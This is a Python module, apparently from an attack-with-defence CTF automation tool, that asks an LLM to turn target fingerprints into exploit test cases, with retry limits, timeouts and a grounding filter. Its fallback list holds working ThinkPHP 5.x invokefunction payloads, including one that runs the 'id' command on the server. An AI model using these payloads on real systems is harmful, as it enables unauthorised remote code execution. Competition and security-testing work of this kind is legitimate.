"""未知指纹分析 → 定向测试用例（plan: analyze.py）。

数据流：llm.analyze(ctx) → schema 校验通过 → payload_gen 生成用例。

防死循环（agent.md §5）：
- retry_cap：单次分析内 LLM 非法输出重试上限。
- analysis_attempts_cap：单目标分析尝试总上限。
- 每次 LLM 调用硬超时；失败/超时走内置字典降级（fallback_test_cases），
  绝不阻塞全局调度。
"""

from __future__ import annotations

from typing import Optional

from loguru import logger

from awd.config import LLMConfig
from awd.llm.client import LLMClient, LLMError
from awd.llm.prompt import ANALYZE_SYSTEM, build_analyze_user
from awd.llm.schema import SchemaValidator, clamp_confidence
from awd.models import TargetContext


class AnalyzeResult:
    """一次分析的产出：用例列表 + 来源（llm|dict）+ 丢弃记录。"""

    def __init__(self, source: str, test_cases: list[dict], dropped: list[dict], error: str = ""):
        self.source = source          # "llm" | "dict"（降级）
        self.test_cases = test_cases
        self.dropped = dropped
        self.error = error

    def __repr__(self) -> str:  # pragma: no cover
        return f"AnalyzeResult(source={self.source!r}, n={len(self.test_cases)}, dropped={len(self.dropped)}, error={self.error!r})"


# 内置降级字典：LLM 不可用时的兜底用例模板（evidence_refs 留空 → 不过滤闸）
_FALLBACK_TEMPLATES = [
    {"type": "rce", "payload": "?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id",
     "target_param": "s", "hypothesis": "ThinkPHP 5.x invokefunction RCE (dict fallback)", "confidence": 0.3},
    {"type": "file_read", "payload": "?s=index/\\think\\app/invokefunction&function=phpinfo",
     "target_param": "s", "hypothesis": "phpinfo via invokefunction (dict fallback)", "confidence": 0.2},
    {"type": "debug", "payload": "?s=index/think/app/invokefunction&function=print_r&vars[0]=1",
     "target_param": "s", "hypothesis": "ThinkPHP debug output (dict fallback)", "confidence": 0.2},
]


def fallback_test_cases(ctx: TargetContext) -> list[dict]:
    """内置字典降级用例（LLM 超时/失败时）。带 route 归一化。"""
    base = ctx.routes[0].path if ctx.routes else "/"
    out = []
    for tpl in _FALLBACK_TEMPLATES:
        tc = dict(tpl)
        tc["payload"] = base + tpl["payload"]
        tc["evidence_refs"] = ""  # 字典来源不做 grounding（见 AnalyzeResult.source）
        out.append(tc)
    return out


class Analyzer:
    """LLM 分析器（含重试上限 + 降级）。"""

    def __init__(
        self,
        client: LLMClient,
        cfg: LLMConfig,
        validator: Optional[SchemaValidator] = None,
        llm_timeout: float = 20.0,
    ):
        self.client = client
        self.cfg = cfg
        self.validator = validator or SchemaValidator()
        self.llm_timeout = llm_timeout
        # analysis_attempts：按 target_id 累计（防死循环），达 cap 直接走降级
        self._attempts: dict[str, int] = {}

    def attempts(self, target_id: str) -> int:
        return self._attempts.get(target_id, 0)

    async def analyze(self, ctx: TargetContext) -> AnalyzeResult:
        """ctx → 定向测试用例。LLM 失败/超限 → 字典降级，永不抛出阻塞调度。"""
        cap = self.cfg.analysis_attempts_cap
        if self._attempts.get(ctx.target_id, 0) >= cap:
            logger.warning("analysis_attempts cap reached for {} — dict fallback", ctx.target_id)
            return AnalyzeResult("dict", fallback_test_cases(ctx), [], "analysis_attempts_cap")

        self._attempts[ctx.target_id] = self._attempts.get(ctx.target_id, 0) + 1

        user = build_analyze_user(ctx)
        last_err = ""
        for attempt in range(1, self.cfg.retry_cap + 1):
            try:
                raw = await self.client.chat_json(
                    ANALYZE_SYSTEM, user,
                    timeout=self.llm_timeout,
                    max_tokens=self.cfg.max_output_tokens,
                )
            except LLMError as e:
                last_err = str(e)
                logger.warning("analyze {} llm attempt {}/{} failed: {}", ctx.target_id, attempt, self.cfg.retry_cap, e)
                continue

            try:
                test_cases = self.validator.validate_structure(raw)
            except Exception as e:  # jsonschema.ValidationError — 非法结构
                last_err = f"schema: {e}"
                logger.warning("analyze {} invalid schema (attempt {}): {}", ctx.target_id, attempt, str(e)[:200])
                continue

            # 防幻觉：evidence_refs 必须命中原文，未命中整条丢弃
            kept, dropped = self.validator.filter_grounding(test_cases, ctx)
            kept = [clamp_confidence(tc) for tc in kept]
            if not kept and dropped:
                # 全部被 grounding 丢弃 → 视为一次失败，重试
                last_err = "all test_cases ungrounded"
                logger.warning("analyze {} all {} test_cases ungrounded (attempt {})",
                               ctx.target_id, len(dropped), attempt)
                continue
            logger.info("analyze {} → {} llm test cases ({} dropped)", ctx.target_id, len(kept), len(dropped))
            return AnalyzeResult("llm", kept, dropped)

        # LLM 不可用/输出始终非法 → 内置字典降级（不阻塞全局）
        logger.warning("analyze {} fell back to dict (last error: {})", ctx.target_id, last_err)
        return AnalyzeResult("dict", fallback_test_cases(ctx), [], last_err)
